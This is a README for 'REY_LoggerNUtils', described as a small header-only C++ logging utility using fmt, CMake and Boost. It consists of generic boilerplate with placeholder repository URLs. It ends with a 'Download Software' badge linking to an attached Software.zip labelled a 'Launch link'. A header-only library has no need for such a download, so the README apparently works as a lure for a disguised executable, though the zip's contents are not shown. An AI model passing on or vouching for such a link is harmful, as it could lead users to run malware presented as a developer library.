# REY_LoggerNUtils

![LoggerNUtils Logo](https://example.com/loggernutils_logo.png)

## Overview

Welcome to the **REY_LoggerNUtils** repository, a really small "Header" file with less than 500 lines of code, designed for faster prints using `fmt` with automated CMAKE build and fetch for external libraries. This repository focuses on simplicity, efficiency, and ease of use in logging utilities for C++ projects.

## Features

🚀 Automated CMAKE build  
🔧 Automated CMAKE fetch for External Libraries  
📈 Fast Prints using `fmt`  
🔍 Boost Logger Integration  
💡 Light-weight and efficient design  

## Table of Contents

1. [Installation](#installation)
2. [Usage](#usage)
3. [Examples](#examples)
4. [Contributing](#contributing)
5. [License](#license)

## Installation

To get started with **REY_LoggerNUtils**, follow these steps:

1. Clone the repository to your local machine:
   ```bash
   git clone https://github.com/your-username/REY_LoggerNUtils.git
   ```
2. Build the project using CMAKE:
   ```bash
   cd REY_LoggerNUtils
   mkdir build && cd build
   cmake ..
   make
   ```

If you encounter any issues during installation, refer to the [Releases](https://github.com/your-username/REY_LoggerNUtils/releases) section.

## Usage

To use **REY_LoggerNUtils** in your C++ project, include the `LoggerNUtils.h` header file in your source code. Initialize the logger and start logging your messages efficiently. Here's a simple example of logging a message:

```cpp
#include "LoggerNUtils.h"

int main() {
    Logger logger;
    logger.log("Hello, LoggerNUtils!");
    return 0;
}
```

For advanced usage and integration with external libraries, refer to the examples section below.

## Examples

### Boost Logger Integration

**REY_LoggerNUtils** seamlessly integrates with Boost Logger for additional logging functionalities. To use Boost Logger in your project, follow these steps:

1. Install Boost Library from [Boost Official Website](https://www.boost.org).
2. Update your CMAKE file to include Boost:
   ```cmake
   find_package(Boost REQUIRED log)
   include_directories(${Boost_INCLUDE_DIR})
   target_link_libraries(your_target ${Boost_LIBRARIES})
   ```

3. Use Boost Logger in your code:
   ```cpp
    #include <boost/log/trivial.hpp>

    BOOST_LOG_TRIVIAL(info) << "Boost Logger Integration Example";
   ```

## Contributing

Contributions to **REY_LoggerNUtils** are welcome! If you have ideas for new features, suggestions for improvements, or find any issues or bugs, please open an issue or submit a pull request on the [GitHub repository](https://github.com/your-username/REY_LoggerNUtils).

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip) (Launch link)